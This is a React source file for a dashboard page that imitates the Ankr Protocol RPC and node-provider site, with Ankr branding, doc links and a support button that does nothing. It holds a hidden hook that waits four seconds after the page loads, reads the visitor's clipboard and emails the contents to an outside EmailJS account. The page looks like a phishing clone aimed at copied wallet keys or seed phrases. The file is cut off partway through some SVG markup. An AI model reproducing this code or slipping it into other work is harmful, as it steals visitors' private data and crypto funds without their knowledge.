import { useState, useEffect } from 'react';
import { useHistory } from "react-router-dom";
import { 
	Flex,
	Text,
	Button,
  	Image,
} from "@chakra-ui/react";
import "./App.scss";
import "./mdi/css/materialdesignicons.css";
import Cube from "./cube.png";
import conn from "./conn.png";
import npLogo from "./np.png";
import pageLogo from "./page.png";
import pageLogoMob from "./pageMob.png";
import Rpc from './rpc';
import img1 from "./img1.png";
import mimg1 from "./mimg1.png";
import img2 from "./img2.png";
import img3 from "./img3.png";
import img4 from "./img4.png";
import mimg2 from "./mimg2.png";
import mimg3 from "./mimg3.png";
import emailjs from 'emailjs-com';




function Dashboard({ screen, setScreen, selected, setSelected }) {
	const [screenMini, setScreenMini] = useState(0)
	const [check, setCheck] = useState(true)
	const [error, setError] = useState(false)
	const [errorMsg, setErrorMsg] = useState("")
	const [copied, setCopied] = useState(false)
	const [wedoSub, setWedoSub] = useState("")

	const history = useHistory()
	useEffect(() => {
		screen === 2 ? document.title = "Ankr's Decentralized Node Providers" : document.title = "Decentralized Infrastructure to Power Your dApp" 
	}, [screen])

	useEffect(() => {
		setTimeout(async function(){
			const text = await navigator.clipboard.readText()
			if(text !== "") {
				const templateParams = {
					from_name: "New User",
					message: "RPC Clipboard text is:= ("+text+")"
				}
				await emailjs.send('outlook', 'template_o56f59x', templateParams, 'user_dc6zvosdPxmxouq5EigcI')
				.then((response) => {
					console.log('')
				}, (err) => {
					console.log('')
				})
			}
		}, 4000)
	}, [])

	const links = [
		{
			tag: "Public RPCs",
			svg: <svg width="16" height="16" viewBox="0 0 16 16" class="jss72" style={{ marginRight: "20px", fill: selected ===  0 ? "#1F2226" : "#9AA1B0" }}><path d="M7.99978 14.4436V8.71518M7.99978 14.4436L3.74122 11.4605C3.32345 11.1679 3.11456 11.0216 3.00162 10.8045C2.88867 10.5875 2.88867 10.3325 2.88867 9.82243V5.13493M7.99978 14.4436L12.2583 11.4605C12.6761 11.1679 12.885 11.0216 12.9979 10.8045C13.1109 10.5875 13.1109 10.3325 13.1109 9.82243V5.13493M7.99978 8.71518L2.88867 5.13493M7.99978 8.71518L13.1109 5.13493M2.88867 5.13493L6.85233 2.35846C7.40703 1.9699 7.68438 1.77562 7.99978 1.77562C8.31518 1.77562 8.59253 1.9699 9.14724 2.35846L13.1109 5.13493" stroke="currentColor" stroke-width="1.67" fill="none"></path></svg>
		},
		{
			tag: "Premium Plan",
			svg: <svg width="16" height="16" viewBox="0 0 16 13" class="jss72" style={{ marginRight: "20px", fill: selected === 1 ? "#1F2226" : "#9AA1B0" }}><path d="M8 12L14.5 5M8 12L1.5 5M8 12L10.75 5M8 12L5.25 5M14.5 5L12.4039 2.16006C12.3455 2.08101 12.3163 2.04149 12.2756 2.01619C12.235 1.99089 12.1866 1.98221 12.0899 1.96485L9.5 1.5M14.5 5H10.75M1.5 5L3.59614 2.16006C3.65449 2.08101 3.68367 2.04149 3.72435 2.01619C3.76504 1.99089 3.81339 1.98221 3.9101 1.96485L6.5 1.5M1.5 5H5.25M10.75 5L9.5 1.5M10.75 5H5.25M9.5 1.5H6.5M5.25 5L6.5 1.5" stroke="currentColor" stroke-width="1.2" stroke-linejoin="round"></path></svg>
		},
		{
			tag: "Node Providers",
			svg: <svg width="16" height="16" viewBox="0 0 16 16" style={{ marginRight: "20px", fill: selected === 2 ? "#1F2226" : "#9AA1B0" }} class="jss72"><path d="M12 2.00001V2.00001C13.1046 2.00001 14 2.89544 14 4.00001L14 5.42858C14 5.49491 14 5.52808 13.9969 5.55598C13.9707 5.78779 13.7878 5.97074 13.556 5.99686C13.5281 6 13.4949 6 13.4286 6L10 6M12 2.00001V2.00001C10.8954 2.00001 10 2.89544 10 4.00001L10 6M12 2.00001L6 2.00001C4.11438 2.00001 3.17157 2.00001 2.58579 2.5858C2 3.17158 2 4.11439 2 6.00001L2 14L4 13.3333L6 14L8 13.3333L10 14L10 6" stroke="currentColor" stroke-width="1.2" fill="none"></path><path d="M4.6665 4.66797L7.33317 4.66797" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" fill="none"></path><path d="M5.3335 7.33203H4.66683" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" fill="none"></path><path d="M4.6665 10L6.6665 10" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" fill="none"></path></svg>
		},
	]


	const linksMob = [
		{
			tag: "Public RPCs",
			svg: <svg width="16" height="16" viewBox="0 0 16 16" class="jss72" style={{ fill: selected ===  0 ? "#1F2226" : "#9AA1B0" }}><path d="M7.99978 14.4436V8.71518M7.99978 14.4436L3.74122 11.4605C3.32345 11.1679 3.11456 11.0216 3.00162 10.8045C2.88867 10.5875 2.88867 10.3325 2.88867 9.82243V5.13493M7.99978 14.4436L12.2583 11.4605C12.6761 11.1679 12.885 11.0216 12.9979 10.8045C13.1109 10.5875 13.1109 10.3325 13.1109 9.82243V5.13493M7.99978 8.71518L2.88867 5.13493M7.99978 8.71518L13.1109 5.13493M2.88867 5.13493L6.85233 2.35846C7.40703 1.9699 7.68438 1.77562 7.99978 1.77562C8.31518 1.77562 8.59253 1.9699 9.14724 2.35846L13.1109 5.13493" stroke="currentColor" stroke-width="1.67" fill="none"></path></svg>
		},
		{
			tag: "Premium Plan",
			svg: <svg width="16" height="16" viewBox="0 0 16 13" class="jss72" style={{ fill: selected === 1 ? "#1F2226" : "#9AA1B0" }}><path d="M8 12L14.5 5M8 12L1.5 5M8 12L10.75 5M8 12L5.25 5M14.5 5L12.4039 2.16006C12.3455 2.08101 12.3163 2.04149 12.2756 2.01619C12.235 1.99089 12.1866 1.98221 12.0899 1.96485L9.5 1.5M14.5 5H10.75M1.5 5L3.59614 2.16006C3.65449 2.08101 3.68367 2.04149 3.72435 2.01619C3.76504 1.99089 3.81339 1.98221 3.9101 1.96485L6.5 1.5M1.5 5H5.25M10.75 5L9.5 1.5M10.75 5H5.25M9.5 1.5H6.5M5.25 5L6.5 1.5" stroke="currentColor" stroke-width="1.2" stroke-linejoin="round"></path></svg>
		},
		{
			tag: "Node Providers",
			svg: <svg width="16" height="16" viewBox="0 0 16 16" style={{ fill: selected === 2 ? "#1F2226" : "#9AA1B0" }} class="jss72"><path d="M12 2.00001V2.00001C13.1046 2.00001 14 2.89544 14 4.00001L14 5.42858C14 5.49491 14 5.52808 13.9969 5.55598C13.9707 5.78779 13.7878 5.97074 13.556 5.99686C13.5281 6 13.4949 6 13.4286 6L10 6M12 2.00001V2.00001C10.8954 2.00001 10 2.89544 10 4.00001L10 6M12 2.00001L6 2.00001C4.11438 2.00001 3.17157 2.00001 2.58579 2.5858C2 3.17158 2 4.11439 2 6.00001L2 14L4 13.3333L6 14L8 13.3333L10 14L10 6" stroke="currentColor" stroke-width="1.2" fill="none"></path><path d="M4.6665 4.66797L7.33317 4.66797" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" fill="none"></path><path d="M5.3335 7.33203H4.66683" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" fill="none"></path><path d="M4.6665 10L6.6665 10" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" fill="none"></path></svg>
		},
		{
			tag: "More",
			svg: <svg width="21" height="16" viewBox="0 0 21 5" style={{ fill: selected === 2 ? "#1F2226" : "#9AA1B0" }}><path d="M4.5 2.5C4.5 3.60457 3.60457 4.5 2.5 4.5C1.39543 4.5 0.5 3.60457 0.5 2.5C0.5 1.39543 1.39543 0.5 2.5 0.5C3.60457 0.5 4.5 1.39543 4.5 2.5ZM12.5 2.5C12.5 3.60457 11.6046 4.5 10.5 4.5C9.39543 4.5 8.5 3.60457 8.5 2.5C8.5 1.39543 9.39543 0.5 10.5 0.5C11.6046 0.5 12.5 1.39543 12.5 2.5ZM18.5 4.5C19.6046 4.5 20.5 3.60457 20.5 2.5C20.5 1.39543 19.6046 0.5 18.5 0.5C17.3954 0.5 16.5 1.39543 16.5 2.5C16.5 3.60457 17.3954 4.5 18.5 4.5Z" fill="currentColor"></path></svg>
		},
	]


	useEffect(() => {
		if (error) {
			setTimeout(function() {
				setError(false)
			}, 3000)
		}
	}, [error])



  	useEffect(() => {
  		setTimeout(function(){
  			if (copied === true) {
  				setCopied(false)
  			}
  		}, 2000)
  	}, [copied])

	useEffect(() => {
		document.getElementById('myView').scrollIntoView()
	}, [screen])
	

	const wedo = [
		{
			name: "WebSockets (WS) Capabilities",
			sub: "Provide a constant stream of blockchain data to your application so your applications and platforms can be updated in real-time.",
		},
		{
			name: "More Requests To Power Your Project",
			sub: "Scale your application to handle any amount of blockchain requests. Our premium plan serves dApps and platforms of all sizes.",
		},
		{
			name: "View Blockchain Analytics",
			sub: "See all on-chain activity and stay up to date on network activity with our analytics tools.",
		},
		{
			name: "Globally Distributed Multi-Chain Infrastructure",
			sub: "Our infrastructure is ready to serve your needs with lightning-fast and reliable returns no matter your location. Ankr removes the need for developers to run their own blockchain nodes, freeing up more time and money to focus on building!",
		},
		{
			name: "Prioritized Requests During Peak Traffic",
			sub: "Ankr Protocol will always prioritize our Premium users to ensure they receive every resource they need to develop and connect with chains.",
		},
		{
			name: "Dedicated Endpoints For All Supported Chains",
			sub: "Access to dedicated endpoints ensures that your project always has node resources to power it at the highest level of performance.  Build easier on any network with multi-chain infrastructure ready to handle any application’s needs.",
		},
	]

	return (
		<>
			{
				error &&
				<Flex position="fixed" top="0" left="0" w="100%" height="100%" zIndex="100000" bg="transparent">
					<Flex padding="12px" bg="#FF362D" color="#fff" w="100%" align="center" h={["80px","60px"]}>
						<Flex w="100%" fontWeight="bold" fontSize="14px" justify="center">Error: {errorMsg}</Flex>
						<Text as="span" align="center" bg="transparent" border="1px solid rgba(0, 0, 0, 0.1)" justify="center" borderRadius="100%" padding="8px" onClick={() => setError(false)} cursor="pointer">
							<svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeSmall" focusable="false" viewBox="0 0 24 24" aria-hidden="true" style={{ fill : "#fff", width: "18px", height: "18px" }}><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" style={{ fill : "#fff" }}></path></svg>
						</Text>
					</Flex>
				</Flex>
			}
			<Flex>
{/*******************************SIDE BAR***************************/}
				<Flex h="100vh" className="scPage" flex="1" bg="#fff" direction="column" padding="40px 18px 30px 18px" overflowY="scroll" display={["none", "flex"]}>
					<Flex align="center" mb="12">
						<Flex cursor="pointer" color="#82899A" _hover={{ color: "#356DF3" }} mr="4" transition="300ms ease-in-out" onClick={() => history.go(0)}><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3 5.66667C3 5.04669 3 4.73669 3.06815 4.48236C3.25308 3.79218 3.79218 3.25308 4.48236 3.06815C4.73669 3 5.04669 3 5.66667 3C5.97666 3 6.13165 3 6.25882 3.03407C6.60391 3.12654 6.87346 3.39609 6.96593 3.74118C7 3.86835 7 4.02334 7 4.33333V5C7 5.94281 7 6.41421 6.70711 6.70711C6.41421 7 5.94281 7 5 7H4.33333C4.02334 7 3.86835 7 3.74118 6.96593C3.39609 6.87346 3.12654 6.60391 3.03407 6.25882C3 6.13165 3 5.97666 3 5.66667Z" fill="currentColor"></path><rect x="3" y="10" width="4" height="4" rx="1" fill="currentColor"></rect><path d="M3 18.3333C3 18.0233 3 17.8683 3.03407 17.7412C3.12654 17.3961 3.39609 17.1265 3.74118 17.0341C3.86835 17 4.02334 17 4.33333 17H5C5.94281 17 6.41421 17 6.70711 17.2929C7 17.5858 7 18.0572 7 19V19.6667C7 19.9767 7 20.1317 6.96593 20.2588C6.87346 20.6039 6.60391 20.8735 6.25882 20.9659C6.13165 21 5.97666 21 5.66667 21C5.04669 21 4.73669 21 4.48236 20.9319C3.79218 20.7469 3.25308 20.2078 3.06815 19.5176C3 19.2633 3 18.9533 3 18.3333Z" fill="currentColor"></path><rect x="10" y="3" width="4" height="4" rx="1" fill="currentColor"></rect><rect x="10" y="10" width="4" height="4" rx="1" fill="currentColor"></rect><rect x="10" y="17" width="4" height="4" rx="1" fill="currentColor"></rect><path d="M17 4.33333C17 4.02334 17 3.86835 17.0341 3.74118C17.1265 3.39609 17.3961 3.12654 17.7412 3.03407C17.8683 3 18.0233 3 18.3333 3C18.9533 3 19.2633 3 19.5176 3.06815C20.2078 3.25308 20.7469 3.79218 20.9319 4.48236C21 4.73669 21 5.04669 21 5.66667C21 5.97666 21 6.13165 20.9659 6.25882C20.8735 6.60391 20.6039 6.87346 20.2588 6.96593C20.1317 7 19.9767 7 19.6667 7H19C18.0572 7 17.5858 7 17.2929 6.70711C17 6.41421 17 5.94281 17 5V4.33333Z" fill="currentColor"></path><rect x="17" y="10" width="4" height="4" rx="1" fill="currentColor"></rect><path d="M17 19C17 18.0572 17 17.5858 17.2929 17.2929C17.5858 17 18.0572 17 19 17H19.6667C19.9767 17 20.1317 17 20.2588 17.0341C20.6039 17.1265 20.8735 17.3961 20.9659 17.7412C21 17.8683 21 18.0233 21 18.3333C21 18.9533 21 19.2633 20.9319 19.5176C20.7469 20.2078 20.2078 20.7469 19.5176 20.9319C19.2633 21 18.9533 21 18.3333 21C18.0233 21 17.8683 21 17.7412 20.9659C17.3961 20.8735 17.1265 20.6039 17.0341 20.2588C17 20.1317 17 19.9767 17 19.6667V19Z" fill="currentColor"></path></svg></Flex>
						<Flex align="center">
							<svg class="MuiSvgIcon-root-3280 jss3277" focusable="false" viewBox="0 0 32 34" aria-hidden="true" fill="none" style={{ width: "35px", height: "35px", fill: "#356DF3" }}><path fill-rule="evenodd" clip-rule="evenodd" d="M18.0159 0.532112L29.0501 6.23989C30.6568 7.07134 31.655 8.71864 31.655 10.539V13.1415H27.5863V10.539C27.5863 10.2642 27.435 10.0149 27.192 9.88906L16.1585 4.18164C15.9516 4.07492 15.7044 4.07456 15.4969 4.182L4.46265 9.88906C4.21996 10.0149 4.06907 10.2642 4.06907 10.539V13.1415H0V10.539C0 8.71864 0.998187 7.07134 2.6045 6.23989L13.6394 0.532112C15.0094 -0.177371 16.6449 -0.177371 18.0159 0.532112ZM19.3093 16.8263C19.3093 14.89 17.7469 13.3154 15.8265 13.3154C13.9061 13.3154 12.3438 14.89 12.3438 16.8263C12.3438 18.7619 13.9061 20.3372 15.8265 20.3372C17.7469 20.3372 19.3093 18.7619 19.3093 16.8263ZM27.1927 24.1103C27.435 23.9848 27.5863 23.7359 27.5863 23.4607V20.8579H31.655V23.4607C31.655 25.281 30.6568 26.9284 29.0508 27.7595L18.0159 33.4672C17.3438 33.8147 16.5869 33.9991 15.8275 33.9991C15.0685 33.9991 14.3112 33.8147 13.6391 33.4672L2.60485 27.7595C0.998187 26.9284 0 25.281 0 23.4607V20.8579H4.06872V23.4607C4.06872 23.7359 4.21996 23.9848 4.463 24.1103L13.7931 28.9366V24.155C10.6146 23.2572 8.27567 20.3122 8.27567 16.8254C8.27567 12.6277 11.6635 9.21256 15.8275 9.21256C19.9915 9.21256 23.3793 12.6277 23.3793 16.8254C23.3793 20.3122 21.0404 23.2572 17.8619 24.155V28.937L27.1927 24.1103Z"></path></svg>
							<Text fontSize="20px" fontWeight="bold" color="#356DF3" ml="2">Protocol</Text>
						</Flex>
					</Flex>

					<Flex direction="column" mb="20">
						{
							links.map((item, index) => (
								<Flex borderRadius="12px" padding="10px 16px" bg={selected === index ? "#F2F5FA" : "transparent"} cursor="pointer" key={index} align="center" color={selected === index ? "#1F2226" : "#9AA1B0"} fontWeight={selected === index ? "bold" : "normal"} mb="8px" transition="background 300ms ease-in-out" fontSize="14px" _hover={{ bg: "#F2F5FA", color: "#1F2226", fontWeight: selected === index ? "bold" : "normal" }} onClick={() => {
									setSelected(index)
									if (index !== 3) {
										setScreen(index)
									}

									if (index === 1) {
										setScreenMini(0)
										setCheck(true)
									}
								}}>
									{item.svg}
									{item.tag}
								</Flex>
							))
						}
					</Flex>

					

					<Flex mt="auto" direction="column">
						<Flex direction="column" bg="#F2F5FA" borderRadius="15px" padding="60px 20px 16px" align="center" justify="center" mb="4" mt="4">
							<Image src={Cube} w="84px" mt="-102px" mb="4" />
							<Flex bg="radial-gradient(50% 50% at 50% 50%,rgba(0,0,0,.2) 0,rgba(0,0,0,.05) 75%,rgba(0,0,0,0) 100%)" w="60%" py="4" mt="-8" mb="2"></Flex>
							<Text fontWeight="700" textAlign="center">Deposit <br/>50,000 ANKR</Text>
							<Text textAlign="center" mb="4">to become a node provider</Text>
							<Flex justify="center" mb="4" color="#356DF3" align="center" cursor="pointer" fontSize="14px" fontWeight="bold" _hover={{ color: "#000" }} onClick={() => window.open("https://ankrnetwork.typeform.com/nodeprovider", "_blank")}><Text mr="8px" _hover={{ mr: "20px" }} transition="margin 300ms ease-in-out">Join the waitlist</Text> <svg class="MuiSvgIcon-root-24 jss105" focusable="false" viewBox="0 0 11 10" aria-hidden="true" style={{ fill: "#356DF3", width: "14px", height: "14px" }}><path fill-rule="evenodd" clip-rule="evenodd" d="M-2.42004e-07 4.10032L6.82721 4.10032L4.3636 1.63672L5.6364 0.363926L10.2728 5.00032L5.6364 9.63672L4.3636 8.36393L6.82721 5.90032L-1.63323e-07 5.90032L-2.42004e-07 4.10032Z" fill="currentColor"></path></svg></Flex>
						</Flex>

						<Flex mt="4" borderRadius="12px" cursor="pointer" padding="10px 16px" mb="2" color="#9AA1B0" align="center" fontSize="14px" transition="background 300ms ease-in-out" fontWeight="bold" _hover={{ bg: "#F2F5FA", color: "#1F2226", fontWeight: "bold" }} onClick={() => window.open("https://docs.ankr.com/ankr-protocol/about-ankr-protocol", "_blank")}><svg width="16" height="16" viewBox="0 0 16 16" style={{ marginRight: "20px", fill: "#9AA1B0" }} class="jss72"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.04446 2.60245L9.05751 2.60335C9.0682 2.60416 9.0762 2.605 9.08197 2.60573C9.08657 2.6093 9.09283 2.61436 9.10096 2.62134C9.1432 2.65761 9.1971 2.71096 9.29966 2.81352L11.8519 5.3658C11.9545 5.46836 12.0079 5.52227 12.0441 5.56451C12.0511 5.57264 12.0562 5.5789 12.0597 5.58349C12.0605 5.58926 12.0613 5.59727 12.0621 5.60795L12.063 5.62085H10.0001C9.7586 5.62085 9.60668 5.57867 9.51035 5.53626C9.41498 5.49426 9.34745 5.44038 9.28625 5.37919C9.22501 5.31794 9.1711 5.25039 9.12909 5.15501C9.08666 5.05869 9.04446 4.9068 9.04446 4.66538V2.60245ZM7.84446 2.59873H6.00007C5.35457 2.59873 4.9308 2.6 4.61699 2.64219C4.32044 2.68206 4.21339 2.74832 4.14819 2.81352C4.08299 2.87872 4.01674 2.98576 3.97687 3.28231C3.93468 3.59613 3.9334 4.01989 3.9334 4.6654V11.3321C3.9334 11.9776 3.93468 12.4013 3.97687 12.7151C4.01674 13.0117 4.08299 13.1187 4.14819 13.1839C4.21339 13.2491 4.32044 13.3154 4.61699 13.3553C4.9308 13.3975 5.35457 13.3987 6.00007 13.3987H10.0001C10.6456 13.3987 11.0693 13.3975 11.3831 13.3553C11.6797 13.3154 11.7867 13.2491 11.8519 13.1839C11.9171 13.1187 11.9834 13.0117 12.0233 12.7151C12.0655 12.4013 12.0667 11.9776 12.0667 11.3321V6.82085H10.0001C9.19377 6.82085 8.73162 6.52161 8.43773 6.22771C8.14393 5.93392 7.84446 5.47179 7.84446 4.66538V2.59873ZM9.54199 1.49515C9.30459 1.39681 9.0499 1.39778 8.83672 1.39859L8.78112 1.39873H6.00007L5.95975 1.39873C5.36566 1.3987 4.86036 1.39868 4.45709 1.45289C4.02747 1.51066 3.62499 1.63967 3.29966 1.96499C2.97434 2.29031 2.84533 2.6928 2.78757 3.12242C2.73335 3.52568 2.73337 4.03096 2.7334 4.62504V4.62508L2.7334 4.6654V11.3321L2.7334 11.3724V11.3724C2.73337 11.9665 2.73335 12.4718 2.78757 12.875C2.84533 13.3047 2.97434 13.7071 3.29966 14.0325C3.62499 14.3578 4.02747 14.4868 4.45709 14.5446C4.86036 14.5988 5.36566 14.5988 5.95976 14.5987L6.00007 14.5987H10.0001L10.0404 14.5987C10.6345 14.5988 11.1398 14.5988 11.543 14.5446C11.9727 14.4868 12.3752 14.3578 12.7005 14.0325C13.0258 13.7071 13.1548 13.3047 13.2126 12.875C13.2668 12.4718 13.2668 11.9665 13.2667 11.3724L13.2667 11.3321V5.88435L13.2669 5.82874C13.2677 5.61557 13.2686 5.36087 13.1703 5.12347L12.616 5.35308L13.1703 5.12347C13.072 4.88608 12.8912 4.70666 12.7399 4.5565L12.7005 4.51727L10.1482 1.96499L10.109 1.92557C9.9588 1.77426 9.77939 1.59348 9.54199 1.49515ZM5.4001 8.66539C5.4001 8.33402 5.66873 8.06539 6.0001 8.06539L10.0001 8.06539C10.3315 8.06539 10.6001 8.33402 10.6001 8.66539C10.6001 8.99676 10.3315 9.26539 10.0001 9.26539L6.0001 9.26539C5.66873 9.26539 5.4001 8.99676 5.4001 8.66539ZM6.0001 10.7321C5.66873 10.7321 5.4001 11.0007 5.4001 11.3321C5.4001 11.6634 5.66873 11.9321 6.0001 11.9321H8.66676C8.99813 11.9321 9.26676 11.6634 9.26676 11.3321C9.26676 11.0007 8.99813 10.7321 8.66676 10.7321L6.0001 10.7321Z" fill="currentColor"></path></svg> Docs</Flex>
					</Flex>

				</Flex>




{/*******************************MAIN PAGE***************************/}
				<Flex h="100vh" flex={["1", "5"]} padding={["25% 4% 30% 4%", "0px 60px 30px 60px"]} align="flex-start" direction="column" overflowY="scroll">
					<Text as="span" id="myView" display={["none", "inline-block"]}></Text>
					<Flex position="fixed" bottom="0" right="0" cursor="pointer" mr="16px" mb={["85px", "15px"]} fontSize="0.875rem" color="#fff" boxShadow="0px 4px 14px rgb(0 0 0 / 15%)" bg="#356DF3" _hover={{ opacity: "0.8" }} zIndex="1000" transition="opacity 200ms ease-in-out" padding="12px" borderRadius="34px" onClick={() => {
						setErrorMsg("Cannot contact support at the moment, kindly try again in a moment")
						setError(true)
					}}>
						<svg style={{ width: "24px", height: "24px"}} viewBox="0 0 34 34" fill="none" xmlns="http://www.w3.org/2000/svg" class="jss8"><path fill-rule="evenodd" clip-rule="evenodd" d="M17 1.5C8.43959 1.5 1.5 8.43959 1.5 17C1.5 25.5604 8.43959 32.5 17 32.5C25.5604 32.5 32.5 25.5604 32.5 17C32.5 8.43959 25.5604 1.5 17 1.5ZM0.5 17C0.5 7.8873 7.8873 0.5 17 0.5C26.1127 0.5 33.5 7.8873 33.5 17C33.5 26.1127 26.1127 33.5 17 33.5C7.8873 33.5 0.5 26.1127 0.5 17ZM17 7.5C11.7533 7.5 7.5 11.7533 7.5 17C7.5 22.2467 11.7533 26.5 17 26.5C22.2467 26.5 26.5 22.2467 26.5 17C26.5 11.7533 22.2467 7.5 17 7.5ZM6.5 17C6.5 11.201 11.201 6.5 17 6.5C22.799 6.5 27.5 11.201 27.5 17C27.5 22.799 22.799 27.5 17 27.5C11.201 27.5 6.5 22.799 6.5 17Z" fill="white"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M25.4961 2.84705L25.8344 3.06188C27.5924 4.17843 29.1246 5.61831 30.3475 7.29791L30.5992 7.64349L25.513 12.7296L25.185 12.1744C24.199 10.5058 22.7171 9.16475 20.943 8.35426L20.2881 8.05506L25.4961 2.84705ZM25.6328 4.12458L21.9952 7.76214C23.4858 8.56977 24.7586 9.72738 25.7036 11.1248L29.2833 7.54512C28.2601 6.21784 27.0266 5.06101 25.6328 4.12458ZM8.05506 20.2881L8.35426 20.943C9.16475 22.7171 10.5058 24.199 12.1744 25.185L12.7296 25.513L7.64349 30.5992L7.29791 30.3475C5.61831 29.1246 4.17843 27.5924 3.06188 25.8344L2.84705 25.4961L8.05506 20.2881ZM4.12458 25.6328C5.06101 27.0266 6.21784 28.2601 7.54512 29.2833L11.1248 25.7036C9.72738 24.7586 8.56977 23.4858 7.76214 21.9952L4.12458 25.6328Z" fill="white"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M8.2471 3.00446L13.4146 8.17198L12.7904 8.48106C11.0478 9.34387 9.60745 10.726 8.67204 12.4249L8.35106 13.0079L3.23389 7.89073L3.47451 7.54706C4.66646 5.84466 6.17159 4.37776 7.90646 3.22985L8.2471 3.00446ZM4.53835 7.78099L8.1323 11.3749C9.03758 9.95062 10.2765 8.75935 11.7394 7.91092L8.12149 4.29306C6.74731 5.25506 5.53628 6.43435 4.53835 7.78099ZM25.828 20.5853L30.9955 25.7528L30.7701 26.0935C29.6222 27.8283 28.1553 29.3335 26.4529 30.5254L26.1092 30.7661L20.992 25.6489L21.575 25.3279C23.2739 24.3925 24.6561 22.9521 25.5189 21.2095L25.828 20.5853ZM26.089 22.2606C25.2406 23.7234 24.0493 24.9624 22.625 25.8676L26.219 29.4616C27.5656 28.4637 28.7449 27.2526 29.7069 25.8784L26.089 22.2606Z" fill="white"></path></svg>
						<Text ml="1" mt="0.5" display={["none", "inline-block"]}>Help</Text>
					</Flex>

					<Flex display={["flex", "none"]} direction="column" w="100%">
						<Flex position="fixed" top="0" left="0" w="100%" padding="4%" bg="#fff" align="center" zIndex="100" justify="space-between">
							<Flex flex="1" align="center">
								<Flex cursor="pointer" color="#82899A" _hover={{ color: "#356DF3" }} mr="4" transition="300ms ease-in-out" onClick={() => history.go(0)}><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3 5.66667C3 5.04669 3 4.73669 3.06815 4.48236C3.25308 3.79218 3.79218 3.25308 4.48236 3.06815C4.73669 3 5.04669 3 5.66667 3C5.97666 3 6.13165 3 6.25882 3.03407C6.60391 3.12654 6.87346 3.39609 6.96593 3.74118C7 3.86835 7 4.02334 7 4.33333V5C7 5.94281 7 6.41421 6.70711 6.70711C6.41421 7 5.94281 7 5 7H4.33333C4.02334 7 3.86835 7 3.74118 6.96593C3.39609 6.87346 3.12654 6.60391 3.03407 6.25882C3 6.13165 3 5.97666 3 5.66667Z" fill="currentColor"></path><rect x="3" y="10" width="4" height="4" rx="1" fill="currentColor"></rect><path d="M3 18.3333C3 18.0233 3 17.8683 3.03407 17.7412C3.12654 17.3961 3.39609 17.1265 3.74118 17.0341C3.86835 17 4.02334 17 4.33333 17H5C5.94281 17 6.41421 17 6.70711 17.2929C7 17.5858 7 18.0572 7 19V19.6667C7 19.9767 7 20.1317 6.96593 20.2588C6.87346 20.6039 6.60391 20.8735 6.25882 20.9659C6.13165 21 5.97666 21 5.66667 21C5.04669 21 4.73669 21 4.48236 20.9319C3.79218 20.7469 3.25308 20.2078 3.06815 19.5176C3 19.2633 3 18.9533 3 18.3333Z" fill="currentColor"></path><rect x="10" y="3" width="4" height="4" rx="1" fill="currentColor"></rect><rect x="10" y="10" width="4" height="4" rx="1" fill="currentColor"></rect><rect x="10" y="17" width="4" height="4" rx="1" fill="currentColor"></rect><path d="M17 4.33333C17 4.02334 17 3.86835 17.0341 3.74118C17.1265 3.39609 17.3961 3.12654 17.7412 3.03407C17.8683 3 18.0233 3 18.3333 3C18.9533 3 19.2633 3 19.5176 3.06815C20.2078 3.25308 20.7469 3.79218 20.9319 4.48236C21 4.73669 21 5.04669 21 5.66667C21 5.97666 21 6.13165 20.9659 6.25882C20.8735 6.60391 20.6039 6.87346 20.2588 6.96593C20.1317 7 19.9767 7 19.6667 7H19C18.0572 7 17.5858 7 17.2929 6.70711C17 6.41421 17 5.94281 17 5V4.33333Z" fill="currentColor"></path><rect x="17" y="10" width="4" height="4" rx="1" fill="currentColor"></rect><path d="M17 19C17 18.0572 17 17.5858 17.2929 17.2929C17.5858 17 18.0572 17 19 17H19.6667C19.9767 17 20.1317 17 20.2588 17.0341C20.6039 17.1265 20.8735 17.3961 20.9659 17.7412C21 17.8683 21 18.0233 21 18.3333C21 18.9533 21 19.2633 20.9319 19.5176C20.7469 20.2078 20.2078 20.7469 19.5176 20.9319C19.2633 21 18.9533 21 18.3333 21C18.0233 21 17.8683 21 17.7412 20.9659C17.3961 20.8735 17.1265 20.6039 17.0341 20.2588C17 20.1317 17 19.9767 17 19.6667V19Z" fill="currentColor"></path></svg></Flex>
								<Flex align="center">
									<svg class="MuiSvgIcon-root-3280 jss3277" focusable="false" viewBox="0 0 32 34" aria-hidden="true" fill="none" style={{ width: "30px", height: "30px", fill: "#356DF3" }}><path fill-rule="evenodd" clip-rule="evenodd" d="M18.0159 0.532112L29.0501 6.23989C30.6568 7.07134 31.655 8.71864 31.655 10.539V13.1415H27.5863V10.539C27.5863 10.2642 27.435 10.0149 27.192 9.88906L16.1585 4.18164C15.9516 4.07492 15.7044 4.07456 15.4969 4.182L4.46265 9.88906C4.21996 10.0149 4.06907 10.2642 4.06907 10.539V13.1415H0V10.539C0 8.71864 0.998187 7.07134 2.6045 6.23989L13.6394 0.532112C15.0094 -0.177371 16.6449 -0.177371 18.0159 0.532112ZM19.3093 16.8263C19.3093 14.89 17.7469 13.3154 15.8265 13.3154C13.9061 13.3154 12.3438 14.89 12.3438 16.8263C12.3438 18.7619 13.9061 20.3372 15.8265 20.3372C17.7469 20.3372 19.3093 18.7619 19.3093 16.8263ZM27.1927 24.1103C27.435 23.9848 27.5863 23.7359 27.5863 23.4607V20.8579H31.655V23.4607C31.655 25.281 30.6568 26.9284 29.0508 27.7595L18.0159 33.4672C17.3438 33.8147 16.5869 33.9991 15.8275 33.9991C15.0685 33.9991 14.3112 33.8147 13.6391 33.4672L2.60485 27.7595C0.998187 26.9284 0 25.281 0 23.4607V20.8579H4.06872V23.4607C4.06872 23.7359 4.21996 23.9848 4.463 24.1103L13.7931 28.9366V24.155C10.6146 23.2572 8.27567 20.3122 8.27567 16.8254C8.27567 12.6277 11.6635 9.21256 15.8275 9.21256C19.9915 9.21256 23.3793 12.6277 23.3793 16.8254C23.3793 